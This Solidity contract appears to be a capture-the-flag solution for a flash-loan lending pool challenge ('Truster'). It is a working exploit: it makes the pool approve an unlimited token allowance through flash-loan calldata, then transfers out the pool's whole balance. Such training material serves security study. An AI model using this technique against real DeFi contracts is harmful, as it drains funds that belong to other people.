// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import './TrusterLenderPool.sol';

/**
 * @title TrusterAttacker
 * @author jb
 */
contract TrusterAttacker {
    address private _owner;

    constructor(address target, address token) {
        _owner = msg.sender;
        _attack(target, token);
    }

    function attack(address target, address token) external {
        _attack(target, token);
    }

    function _attack(address target, address token) internal {
        IERC20 erc20 = IERC20(token);
        bytes memory payload = abi.encodeWithSignature(
            'approve(address,uint256)',
            address(this),
            type(uint256).max
        );
        TrusterLenderPool(target).flashLoan(0, target, token, payload);
        erc20.transferFrom(target, _owner, erc20.balanceOf(target));
    }
}
